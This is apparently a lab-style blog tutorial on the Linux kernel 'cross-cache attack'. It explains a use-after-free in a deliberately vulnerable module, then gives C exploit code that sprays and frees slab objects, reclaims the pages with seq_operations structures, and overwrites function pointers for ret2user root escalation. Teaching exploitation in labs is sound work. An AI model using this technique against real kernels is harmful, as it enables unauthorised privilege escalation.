In this post, I will explain cross-cache attack, a fundamental technique for advanced Linux kernel exploitation. Understanding this technique is important to understand other exploitation techniques, such as Dirty PageTable and DirtyCred, which I will cover in future posts. Download the [handouts](https://github.com/r1ru/linux-kernel-exploitation/tree/main/cross-cache-attack) beforehand.

## Analysis
The vulnerable LKM provides three commands: `CMD_ALLOC`, `CMD_WRITE`, and `CMD_FREE`. These commands are used to allocate, write to, and free objects defined as follows:
```c
#define OBJ_SIZE    0x200

struct obj {
    char buf[OBJ_SIZE];
};
```
Note that `obj_alloc` and `obj_free` internally use `kmem_cache_zalloc` and `kmem_cache_free`, respectively.
This means a dedicated cache is used for managing these objects:
```c
static long obj_alloc(int id) {
    if (objs[id] != NULL) {
        return -1;
    }
    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    if (objs[id] == NULL) {
        return -1;
    }
    return 0;
}
```
```c
static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}
```
The cache is created in `module_initialize`:
```c
static int __init module_initialize(void) {
    if (misc_register(&vuln_dev) != 0) {
        return -1;
    }
    obj_cachep = KMEM_CACHE(obj, 0);
    if (!obj_cachep) {
        return -1;
    }
    return 0;
}
```

## Bugs
In `obj_free`, `objs[id]`, which is a reference to a freed memory region, is not cleared:
```c
static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}
```
This results in an obvious UAF. Since we already have a write primitive, it's natural to think about overlapping freed objects with some useful kernel objects, like `struct seq_operations` or `struct tty_struct`, to overwrite function pointers and control RIP. However, we cannot simply do this, since the objects are allocated from a dedicated cache. This is where cross-cache attack comes in.

## Cross-Cache Attack
The main idea of cross-cache attack is to turn a dangling reference to an object into a dangling reference to its underlying pages. As you may know, kernel objects are allocated from slab caches, which consist of one or more slabs. Each slab is made up of `2^order` pages and contains `objs_per_slab` objects. These values can be found in /sys/kernel/slab/\<CACHE_NAME\>.

When all objects in a slab are freed, underlying pages are returned to the buddy allocator if the following additional conditions are met:
- The slab is not the active slab
- The per-cpu partial slab list is full

This technique is extremely powerful. It lets us ideally overlap victim objects with any kernel object.

## Exploitation
First, we allocate `objs_per_slab * (cpu_partial + 1)` objects to prepare `cpu_partial + 1` slabs, which will later be used to fill the per-cpu partial slab list:
```c
int objs_per_slab = 8;
int cpu_partial = 52;
int num_sprary = objs_per_slab * (cpu_partial + 1);

for (int i = 0; i < num_sprary; i++) {
    obj_alloc(i);
}
```
Next, we allocate one object to create a new active slab:
```c
obj_alloc(num_sprary);
```
Next, we free the objects in the slabs obtained in the first step to fill the per-cpu partial slab list and release the underlying order-0 pages. To increase the reliability, we only free all objects in even-numbered slabs. This is because if continuous pages are freed, the buddy allocator will merge them and treat them as higher-order pages, which makes it more difficult to reclaim them later:
```c
for (int i = 0; i < num_sprary; i += objs_per_slab) {
    if (i % (objs_per_slab * 2) == 0) {
        for (int j = i; j < i + objs_per_slab; j++) {
            obj_free(j);
        }
    } else {
        obj_free(i);
    }
}
```
Next, we allocate a large number of `struct seq_operations` and make the order-0 pages freed in the previous step be used as the kmalloc-32 slabs. Since kmalloc-32 also uses order-0 pages, the attack has a high chance of success:
```c
int seqfds[0x20];
for (int i = 0; i < 0x20; i++) {
    seqfds[i] = open("/proc/self/stat", O_RDONLY);
    assert(seqfds[i] >= 0);
}
```
Finally, we use `CMD_WRITE` to overwrite function pointers in `struct seq_operations` and control RIP. Since SMAP, SMEP, KASLR, and KPTI are disabled, we can easily escalate privileges via ret2user:
```c
char payload[0x8];
*(unsigned long *)&payload = (unsigned long)escalate_privilege;

for (int i = 0; i < num_sprary; i += objs_per_slab) {
    if (i % (objs_per_slab * 2) == 0) {
        obj_write(i, payload, 0x8);
    }
}

for (int i = 0; i < 0x20; i++) {
    read(seqfds[i], payload, 1);
}
```
By running this exploit, we can achive root privileges and see the flag:
